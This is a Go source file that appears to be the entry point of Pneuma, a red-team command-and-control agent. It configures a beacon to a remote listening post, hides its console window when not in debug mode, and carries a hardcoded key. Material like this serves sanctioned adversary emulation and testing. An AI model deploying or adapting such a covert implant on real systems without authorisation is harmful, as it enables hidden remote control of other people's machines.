package main

import (
	"flag"
	"github.com/preludeorg/pneuma/sockets"
	"github.com/preludeorg/pneuma/util"
	"os"
	"strings"
)

var key = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"


func main() {
	agent := util.BuildAgentConfig()
	name := flag.String("name", agent.Name, "Give this agent a name")
	contact := flag.String("contact", agent.Contact, "Which contact to use")
	address := flag.String("address", agent.Address, "The ip:port of the socket listening post")
	group := flag.String("range", agent.Range, "Which range to associate to")
	sleep := flag.Int("sleep", agent.Sleep, "Number of seconds to sleep between beacons")
	useragent := flag.String("useragent", agent.Useragent, "User agent used when connecting")
	util.DebugMode = flag.Bool("debug", false, "Write debug output to console")
	flag.Parse()
	agent.SetAgentConfig(map[string]interface{}{
		"Name": *name,
		"Contact": *contact,
		"Address": *address,
		"Range": *group,
		"Useragent": *useragent,
		"Sleep": *sleep,
	})
	if !*util.DebugMode {
		util.HideConsole()
	}
	if !strings.Contains(agent.Address, ":") {
		util.DebugLogf("Your address is incorrect\n")
		os.Exit(1)
	}
	util.EncryptionKey = &agent.AESKey
	sockets.UA = &agent.Useragent
	util.DebugLogf("[%s] agent at PID %d using key %s", agent.Address, agent.Pid, key)
	sockets.EventLoop(agent, agent.BuildBeacon())
}
